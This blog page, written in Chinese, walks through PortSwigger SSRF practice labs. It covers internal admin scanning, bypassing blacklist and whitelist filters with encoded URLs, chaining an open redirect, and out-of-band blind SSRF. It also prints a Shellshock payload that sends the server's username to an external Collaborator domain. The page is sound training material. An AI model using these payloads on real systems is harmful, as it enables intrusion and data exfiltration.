+<h2 id="针对其他后端系统的-SSRF-攻击-1"><a href="#针对其他后端系统的-SSRF-攻击-1" class="headerlink" title="针对其他后端系统的 SSRF 攻击"></a>针对其他后端系统的 SSRF 攻击</h2><h3 id="靶场地址-1"><a href="#靶场地址-1" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system">web-security/ssrf/lab-basic-ssrf-against-backend-system</a></p>
+<h3 id="靶场说明-1"><a href="#靶场说明-1" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>
+<p>要完成实验，请使用库存检查功能<code>192.168.0.X</code>在端口 8080 上扫描管理界面的内部范围，然后使用它删除用户<code>carlos</code>。</p>
+<h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>简单点说就是上一个实验+爆破url</p>
+<p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送给 Burp Intruder。</p>
+<p>2、先清除标记，然后将<code>stockApi</code>参数中的url更改为<code>http://192.168.0.1:8080/admin</code>，并标记IP地址的最后一位，即标记“1”。</p>
+<p><img src="https://s2.loli.net/2022/07/20/of5wsKZhJTQilXC.png"></p>
+<p>3、切换到 Payloads 选项，将Payload类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。</p>
+<p><img src="https://s2.loli.net/2022/07/20/ihI1bAo528JYNUd.png"></p>
+<p>4、开始攻击。单击“Status”列按状态码升序对其进行排序。您应该看到一个状态为 200 的条目，显示一个管理界面。</p>
+<p><img src="https://s2.loli.net/2022/07/20/LUaczrjxIiBQ2gq.png" alt="image-20220720134033145"></p>
+<p>5、现在我们知道管理地址为192.168.1.252/admin。单击此请求，将其发送到 Repeater，并将路径更改为：``/admin/delete?username=carlos<code>，即可删除</code>carlos`用户。</p>
+<p><img src="https://s2.loli.net/2022/07/20/QBJK1U8lwqLmP4i.png"></p>
+<h2 id="常见的-SSRF-防御绕过"><a href="#常见的-SSRF-防御绕过" class="headerlink" title="常见的 SSRF 防御绕过"></a>常见的 SSRF 防御绕过</h2><p>通常会看到包含 SSRF 行为的应用程序以及旨在防止恶意利用的防御措施。通常，可以绕过这些防御措施。</p>
+<ul>
+<li><p>绕过基于黑名单的 SSRF防御措施</p>
+</li>
+<li><p>绕过基于白名单的SSRF防御措施</p>
+</li>
+<li><p>通过开放重定向绕过SSRF防御措施</p>
+</li>
+</ul>
+<h2 id="基于黑名单的SSRF防御措施绕过"><a href="#基于黑名单的SSRF防御措施绕过" class="headerlink" title="基于黑名单的SSRF防御措施绕过"></a>基于黑名单的SSRF防御措施绕过</h2><p>一些应用程序会阻止包含诸如<code>127.0.0.1</code>、<code>localhost</code>之类的主机名或诸如<code>/admin</code>之类的url，在这种情况下，您通常可以使用各种技术绕过过滤器：</p>
+<ul>
+<li>使用替代 IP 表示<code>127.0.0.1</code>，例如<code>2130706433</code>、<code>017700000001</code>或<code>127.1</code>。</li>
+<li>将您自己的域名解析为<code>127.0.0.1</code>. 您可以<code>spoofed.burpcollaborator.net</code>用于此目的。</li>
+<li>使用 URL 编码或大小写变体混淆被阻止的字符串。</li>
+</ul>
+<h3 id="靶场地址-2"><a href="#靶场地址-2" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter">web-security/ssrf/lab-ssrf-with-blacklist-filter</a></p>
+<h3 id="靶场说明-2"><a href="#靶场说明-2" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>
+<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>
+<p>开发人员部署了两个需要绕过的SSRF 弱防御措施。</p>
+<h3 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。将<code>stockApi</code>参数中 的 URL 更改为<code>http://127.0.0.1/</code>，观察到请求被阻止。</p>
+<p><img src="https://s2.loli.net/2022/07/20/9GVIfWYCJvoRl8p.png"></p>
+<p>2、通过将 URL 更改为：<code>http://localhost/</code>,还是被防火墙拦截了!</p>
+<p><img src="https://s2.loli.net/2022/07/20/gU8ZfXyls3DIM1T.png"></p>
+<p>3、通过双 URL 编码将``a<code>混淆为 </code>%25%36%31<code>,此时为</code><a href="http://loc%25%36%31lhost/`。防火墙未拦截，成功以管理员身份访问系统。">http://loc%25%36%31lhost/`。防火墙未拦截，成功以管理员身份访问系统。</a></p>
+<p><img src="https://s2.loli.net/2022/07/20/DIlsn7wHzvSxGKR.png"></p>
+<p>4、搜索管理面板url</p>
+<p><img src="https://s2.loli.net/2022/07/20/bJKO8hWygCVB1a5.png"></p>
+<p>5、访问管理面板</p>
+<p><img src="https://s2.loli.net/2022/07/20/N8e7TJIXoyVauBK.png"></p>
+<p>6、又拦截了，再次将admin中的<code>a</code>url编码两次提交,绕过防火墙!</p>
+<p><img src="https://s2.loli.net/2022/07/20/wQOf8Emn6P4rdyu.png"></p>
+<p>7、删除carlos账户</p>
+<p><img src="https://s2.loli.net/2022/07/20/XfptgY2mdOKSWjz.png"></p>
+<p>8、验证一下看是不是删除掉了，目前只剩下一个账户,成功删除carlos,实验完成.</p>
+<p><img src="https://s2.loli.net/2022/07/20/N5t6hrVaTOfo42e.png"></p>
+<h2 id="基于白名单的-SSRF防御措施"><a href="#基于白名单的-SSRF防御措施" class="headerlink" title="基于白名单的 SSRF防御措施"></a>基于白名单的 SSRF防御措施</h2><p>某些应用程序只允许匹配、或包含允许值的白名单的输入。在这种情况下，您有时可以通过利用 URL 解析中的不一致来绕过过滤器。</p>
+<p>URL 规范包含许多在实现 URL的即时解析和验证时容易被忽视的特性：</p>
+<ul>
+<li>您可以使用<code>@</code>字符 在主机名之前的 URL 中嵌入凭据。例如：<code>https://expected-host@evil-host</code></li>
+<li>您可以使用<code>#</code>字符来指示 URL 片段。例如：<code>https://evil-host#expected-host</code></li>
+<li>您可以利用 DNS 命名层次结构将所需的输入放入您控制的完全限定的 DNS 名称中。例如：<code>https://expected-host.evil-host</code></li>
+<li>您可以对字符进行 URL 编码以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式不同于执行后端 HTTP 请求的代码，这将特别有用。</li>
+<li>您可以一起使用这些技术的组合。</li>
+</ul>
+<h3 id="靶场地址-3"><a href="#靶场地址-3" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter">web-security/ssrf/lab-ssrf-with-whitelist-filter</a></p>
+<h3 id="靶场说明-3"><a href="#靶场说明-3" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>
+<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>
+<p><strong>开发人员已经部署了您需要绕过的反 SSRF 防御。</strong></p>
+<h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>
+<p>将<code>stockApi</code>参数中 的 URL 更改为<code>http://127.0.0.1/</code>并观察应用程序正在解析 URL、提取主机名并根据白名单对其进行验证。</p>
+<p><img src="https://s2.loli.net/2022/07/20/L7lOQnhRy49VAja.png"></p>
+<p>2、将 URL 更改为<code>http://username@stock.weliketoshop.net/</code>并观察它是否被接受，这表明 URL 解析器支持嵌入式凭据。</p>
+<p><img src="https://s2.loli.net/2022/07/20/FZI8wMgnGbPoixC.png"></p>
+<p>3、将<code>#</code>附加到用户名后并观察到该 URL 现在被拒绝。</p>
+<p><img src="https://s2.loli.net/2022/07/20/CZVYM1XjwbWRsNt.png"></p>
+<p>4、双 URL 编码<code>#</code>为<code>%2523</code>，并观察到响应，表明服务器已经访问localhost。</p>
+<p><img src="https://s2.loli.net/2022/07/20/wL82XeydGsgpqUW.png"></p>
+<p>5、改成如下url:访问到admin页面</p>
+<p><img src="https://s2.loli.net/2022/07/20/13UBzIgY5oVGxvn.png"></p>
+<p>6、要访问管理界面并删除目标用户，请将 URL 更改为：<code>http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos</code></p>
+<p><img src="https://s2.loli.net/2022/07/20/AhlNIv48S92Mcrm.png"></p>
+<h2 id="通过开放重定向漏洞绕过的-SSRF防御"><a href="#通过开放重定向漏洞绕过的-SSRF防御" class="headerlink" title="通过开放重定向漏洞绕过的 SSRF防御"></a>通过开放重定向漏洞绕过的 SSRF防御</h2><p>有时可以通过利用开放重定向漏洞来绕过任何类型的基于过滤器的防御。</p>
+<p>在前面的 SSRF 示例中，假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许 URL 的应用程序包含一个开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，则您可以构造一个满足过滤器的 URL 并导致重定向请求到所需的后端目标。</p>
+<p>例如，假设应用程序包含一个开放重定向漏洞，其中URL如下：</p>
+<pre><code class="bash">/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net
+</code></pre>
+<p>返回重定向到：</p>
+<pre><code>http://evil-user.net
+</code></pre>
+<p>您可以利用开放重定向漏洞绕过URL过滤器，利用SSRF漏洞如下：</p>
+<pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin
+</code></pre>
+<p>这个 SSRF 漏洞利用有效，因为应用程序首先验证<code>stockAPI</code>提供的URL 是否在允许的域上，它就是。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。</p>
+<h3 id="靶场地址-4"><a href="#靶场地址-4" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection">web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection</a></p>
+<h3 id="靶场说明-4"><a href="#靶场说明-4" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>
+<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://192.168.0.12:8080/admin</code>并删除用户<code>carlos</code>。</p>
+<p>库存检查器已被限制为只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向漏洞。</p>
+<h3 id="实验思路-1"><a href="#实验思路-1" class="headerlink" title="实验思路"></a>实验思路</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>
+<p>尝试篡改<code>stockApi</code>参数，观察到无法让服务器直接向不同的主机发出请求。</p>
+<p><img src="https://s2.loli.net/2022/07/20/DxULHK7S6ocXd9J.png"></p>
+<p>2、点击“下一个产品”，观察<code>path</code>参数被放入重定向响应的Location头中，导致开放重定向。</p>
+<p><img src="https://s2.loli.net/2022/07/20/f2eQm8MokCt1xUW.png"></p>
+<p>3、创建一个利用开放重定向漏洞的 URL，并重定向到管理界面，并将其输入到库存检查器的<code>stockApi</code>参数中。构造payload如下：</p>
+<pre><code>/product/nextProduct?path=http://192.168.0.12:8080/admin
+</code></pre>
+<p>   观察库存检查器是否遵循重定向并向您显示管理页面。</p>
+<p><img src="https://s2.loli.net/2022/07/20/1TCabPfhIMFEZs8.png"></p>
+<p>4、修改路径以删除目标用户：</p>
+<pre><code>/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+</code></pre>
+<p><img src="https://s2.loli.net/2022/07/20/OMnjRNU8lph9dxD.png"></p>
+<p>成功删除carlos,完成实验。</p>
+<h2 id="盲-SSRF-漏洞"><a href="#盲-SSRF-漏洞" class="headerlink" title="盲 SSRF 漏洞"></a>盲 SSRF 漏洞</h2><p>盲 SSRF 通常更难利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。</p>
+<h3 id="什么是盲-SSRF？"><a href="#什么是盲-SSRF？" class="headerlink" title="什么是盲 SSRF？"></a>什么是盲 SSRF？</h3><p>当可以诱导应用程序向提供的 URL 发出后端 HTTP 请求，但后端请求的响应未在应用程序的前端响应中返回时，就会出现盲 SSRF 漏洞。</p>
+<h3 id="盲-SSRF-漏洞的影响是什么？"><a href="#盲-SSRF-漏洞的影响是什么？" class="headerlink" title="盲 SSRF 漏洞的影响是什么？"></a>盲 SSRF 漏洞的影响是什么？</h3><p>盲 SSRF 漏洞的影响通常低于完全知情的 SSRF 漏洞，因为它们具有单向性。不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完整的远程代码执行。</p>
+<h3 id="如何发现和利用盲-SSRF-漏洞"><a href="#如何发现和利用盲-SSRF-漏洞" class="headerlink" title="如何发现和利用盲 SSRF 漏洞"></a>如何发现和利用盲 SSRF 漏洞</h3><p>检测盲 SSRF 漏洞最可靠的方法是使用带外 ( <a target="_blank" rel="noopener" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a> ) 技术。这涉及尝试向您控制的外部系统触发 HTTP 请求，并监视与该系统的网络交互。</p>
+<p>使用带外技术最简单、最有效的方法是使用<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>。您可以使用<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，那么它很容易受到 SSRF 的攻击。</p>
+<pre><code>提示:
+在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的 DNS 查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始 DNS 查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站 DNS 流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。
+</code></pre>
+<h3 id="带外检测的盲SSRF"><a href="#带外检测的盲SSRF" class="headerlink" title="带外检测的盲SSRF"></a>带外检测的盲SSRF</h3><p>简单地识别可以触发带外 HTTP 请求的盲<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p>
+<h3 id="靶场地址-5"><a href="#靶场地址-5" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection">portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection</a></p>
+<h3 id="靶场说明-5"><a href="#靶场说明-5" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p>
+<p>要解决实验室问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。</p>
+<pre><code>注意事项:
+为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。
+</code></pre>
+<h3 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、在<a target="_blank" rel="noopener" href="https://portswigger.net/burp/pro">Burp Suite Professional</a>中，转到 Burp 菜单并启动<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>。</p>
+<p><img src="https://s2.loli.net/2022/07/20/TDyOd8hwWrEzsZG.png"></p>
+<p>2、单击“复制到剪贴板”以将唯一的 Burp Collaborator 有效负载复制到剪贴板。让 Burp Collaborator 客户端窗口保持打开状态。</p>
+<p><img src="https://s2.loli.net/2022/07/20/F47CPxqtzypruD8.png"></p>
+<p>3、访问一个产品，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>
+<p>4、更改 Referer 标头以使用生成的 Burp Collaborator 域代替原始域。发送请求。</p>
+<p><img src="https://s2.loli.net/2022/07/21/GDs9g5CIfHMSYTU.png"></p>
+<p>5、返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。</p>
+<p>6、您应该会看到一些由应用程序启动的 DNS 和 HTTP 交互，这些交互是您的有效负载的结果。</p>
+<p><img src="https://s2.loli.net/2022/07/21/34EbJzx2jr9IRWg.png"></p>
+<h2 id="使用-Shellshock-利用盲SSRF"><a href="#使用-Shellshock-利用盲SSRF" class="headerlink" title="使用 Shellshock 利用盲SSRF"></a>使用 Shellshock 利用盲SSRF</h2><p>简单地识别可以触发带外 HTTP 请求的盲<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p>
+<h3 id="靶场地址-6"><a href="#靶场地址-6" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">web-security/ssrf/blind/lab-shellshock-exploitation</a></p>
+<h3 id="靶场说明-6"><a href="#靶场说明-6" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p>
+<p>为了完成实验，请使用此功能对 8080 端口范围内的内部服务器<code>192.168.0.X</code>执行<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind">盲 SSRF</a>攻击。在盲攻击中，对内部服务器使用 Shellshock 有效负载以泄露操作系统用户的名称。</p>
+<h3 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、在<a target="_blank" rel="noopener" href="https://portswigger.net/burp/pro">Burp Suite Professional</a>中，从 BApp Store 安装“Collaborator Everywhere”扩展。</p>
+<p><img src="https://s2.loli.net/2022/07/21/g4Ye52DRaJC9LuS.png"></p>
+<p>2、将实验室的域添加到 Burp Suite 的<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/target/scope">Scope</a>，以便 Collaborator Everywhere 将其作为目标。</p>
+<p>浏览网站。</p>
+<p><img src="https://s2.loli.net/2022/07/21/2qsKx385czIFi9B.png"></p>
+<p><img src="https://s2.loli.net/2022/07/21/a6gEIPukQ9xB4Fb.png" alt="image-20220721125833574"></p>
+<p>3、请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。</p>
+<p><img src="https://s2.loli.net/2022/07/21/qmHOIcuDAlCzax3.png"></p>
+<p>4、观察 HTTP 交互在 HTTP 请求中包含您的 User-Agent 字符串。</p>
+<p><img src="https://s2.loli.net/2022/07/21/MVJ5uPreEqoHTFm.png"></p>
+<p>5、将请求发送到产品页面给 Burp Intruder。</p>
+<p>6、使用<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>生成唯一的 Burp Collaborator 有效负载，并将其放入以下 Shellshock 有效负载中：</p>
+<pre><code>() &#123; :; &#125;; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+</code></pre>
+<p>7、将 Burp Intruder 请求中的 User-Agent 字符串替换为包含您的 Collaborator 域的 Shellshock 有效负载。</p>
+<p>单击“清除 §”，将 Referer 标头更改为<code>http://192.168.0.1:8080</code>突出显示 IP 地址的最后一个八位字节（数字<code>1</code>），单击“添加 §”。</p>
+<p><img src="https://s2.loli.net/2022/07/21/SOEUW1uJGo2lNr8.png"></p>
+<p>8、切换到 Payloads 选项卡，将有效负载类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。</p>
+<p><img src="https://s2.loli.net/2022/07/21/ZTIia8tKdES7FWk.png"></p>
+<p>9、点击“开始攻击”。</p>
+<p>攻击完成后，返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">您应该会看到由成功的盲SSRF 攻击</a>命中的后端系统发起的 DNS 交互。操作系统用户的名称应出现在 DNS 子域中。</p>
+<p><img src="https://s2.loli.net/2022/07/21/krIKytbocuZSFQv.png"></p>
+<p>要完成实验，请输入操作系统用户的名称。</p>
+<p><img src="https://s2.loli.net/2022/07/21/VUYweFM2ZaLK9p3.png"></p>
+<p>另一种利用盲SSRF漏洞的途径是诱使应用程序连接到攻击者控制的系统，并向建立连接的HTTP客户端返回恶意响应。如果您可以利用服务器 HTTP 实现中的严重客户端漏洞，您可能能够在应用程序基础架构中实现远程代码执行。<a target="_blank" rel="noopener" href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient">点击详细阅读</a>。</p>
+<h2 id="为-SSRF-漏洞寻找隐藏的攻击面"><a href="#为-SSRF-漏洞寻找隐藏的攻击面" class="headerlink" title="为 SSRF 漏洞寻找隐藏的攻击面"></a>为 SSRF 漏洞寻找隐藏的攻击面</h2><p>许多服务器端请求伪造漏洞相对容易被发现，因为应用程序的正常流量涉及包含完整 URL 的请求参数。SSRF 的其他示例更难找到。</p>
+<h3 id="请求中的部分-URL"><a href="#请求中的部分-URL" class="headerlink" title="请求中的部分 URL"></a>请求中的部分 URL</h3><p>有时，应用程序仅将主机名或 URL 路径的一部分放入请求参数中。然后，提交的值会在服务器端合并到请求的完整 URL 中。如果该值很容易被识别为主机名或 URL 路径，那么潜在的攻击面可能很明显。但是，作为完整 SSRF 的可利用性可能会受到限制，因为您无法控制所请求的整个 URL。</p>
+<h3 id="数据格式中的-URL"><a href="#数据格式中的-URL" class="headerlink" title="数据格式中的 URL"></a>数据格式中的 URL</h3><p>一些应用程序以其规范允许包含可能由数据解析器请求的格式的 URL 的格式传输数据。一个明显的例子是 XML 数据格式，它已广泛用于 Web 应用程序中，用于将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并对其进行解析时，它可能容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XXE 注入</a>的攻击，进而容易受到 XXE 的 SSRF 攻击。当我们查看<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XXE 注入</a>漏洞时，我们将更详细地介绍这一点。</p>
+<h3 id="通过Referer头的SSRF"><a href="#通过Referer头的SSRF" class="headerlink" title="通过Referer头的SSRF"></a>通过Referer头的SSRF</h3><p>一些应用程序使用跟踪访问者的服务器端分析软件。该软件经常在请求中记录 Referer 标头，因为这对于跟踪传入链接特别有用。通常，分析软件实际上会访问出现在 Referer 标头中的任何第三方 URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer 标头通常代表 SSRF 漏洞的有效攻击面。有关涉及 Referer 标头的漏洞示例，请参阅<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind">盲 SSRF 漏洞</a>。</p>
+<hr>
+<blockquote>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">Web Security Academy-SSRF</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/ssrf-lab/">portswigger ssrf lab 服务器端请求伪造靶场</a></p>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">Web安全学习笔记-4.4 SSRF</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321535.html">关于SSRF和多种绕过方式</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kaituorensheng/p/3776527.html">URL中“#” “？” &amp;“”号的作用</a></p>
+</blockquote>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1370227996@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: 'e98f09a376e17cb36a4f',
+            clientSecret: 'd1ce9651c88bec3fdc2245ecdf84d4e36d62b3d8',
+            repo: 'colind0pe.github.io',
+            owner: 'colind0pe',
+            admin: ['colind0pe'],
+            id: decodeURI(location.pathname),
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2020-2021 colind0pe
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
